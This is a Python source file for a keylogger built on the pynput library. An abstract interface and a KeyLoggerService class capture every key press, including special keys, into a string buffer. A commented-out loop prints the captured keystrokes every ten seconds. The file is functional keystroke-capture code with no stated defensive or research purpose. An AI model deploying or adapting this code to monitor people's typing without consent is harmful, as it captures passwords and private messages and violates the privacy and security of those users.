from pynput.keyboard import Listener,Key
from abc import ABC, abstractmethod
from typing import List
import time

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None: 
        pass
     
    @abstractmethod
    def stop_logging(self) -> None: 
        pass
     
    @abstractmethod
    def get_logged_keys(self) -> List[str]: 
        pass




class KeyLoggerService (IKeyLogger):
    def __init__(self):
        self.logged_keys: str = ""
        self.listener = None

    def on_press(self, key):
        try:
            self.logged_keys += key.char
        except AttributeError:
            self.logged_keys += (str(key))
            # TODO match case

    def start_logging(self) -> None:
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        print("Logging started!")

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
            print("Logging stopped!")

    def get_logged_keys(self) -> str:
        temp = self.logged_keys
        self.logged_keys = ""
        return  temp


# keylogger = KeyLoggerService()
# keylogger.start_logging()
#
#
# while True:
#     print(keylogger.logged_keys)
#     time.sleep(10)